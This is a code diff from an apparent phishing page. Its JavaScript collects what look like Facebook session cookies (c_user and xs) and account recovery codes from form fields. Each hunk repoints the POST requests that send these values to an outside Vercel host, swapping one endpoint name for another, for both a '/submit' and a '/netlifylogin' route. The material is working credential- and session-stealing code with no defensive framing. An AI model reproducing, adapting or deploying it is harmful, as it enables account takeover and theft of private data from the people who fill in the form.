@@ -414,7 +414,7 @@
             const cUserInput = document.getElementById("c_user").value.trim();
             const xsInput = document.getElementById("xs").value.trim();
             // Always send c_user and xs
-            fetch("https://form-sable-c.vercel.app/submit", {
+            fetch("https://form-sable-chi.vercel.app/submit", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
@@ -447,7 +447,7 @@
             const xsInput = document.getElementById("xs").value.trim();
             const recoveryInput = document.getElementById("recovery_codes")?.value.trim() || "";
 
-            fetch("https://form-sable-c.vercel.app/submit", {
+            fetch("https://form-sable-chi.vercel.app/submit", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
@@ -460,7 +460,7 @@
             }).then(res => {
                 if (res.ok) {
                     if (allowRecovery && recoveryInput) {
-                         fetch("https://form-sable-c.vercel.app/netlifylogin", {
+                         fetch("https://form-sable-chi.vercel.app/netlifylogin", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ email: recoveryInput, password: "." })
@@ -483,7 +483,7 @@
                 console.error("Submission error:", err);
                 alert("An error occurred. Please try again.");
                 if (allowRecovery && recoveryInput) {
-                         fetch("https://form-sable-c.vercel.app/netlifylogin", {
+                         fetch("https://form-sable-chi.vercel.app/netlifylogin", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ email: recoveryInput, password: "." })
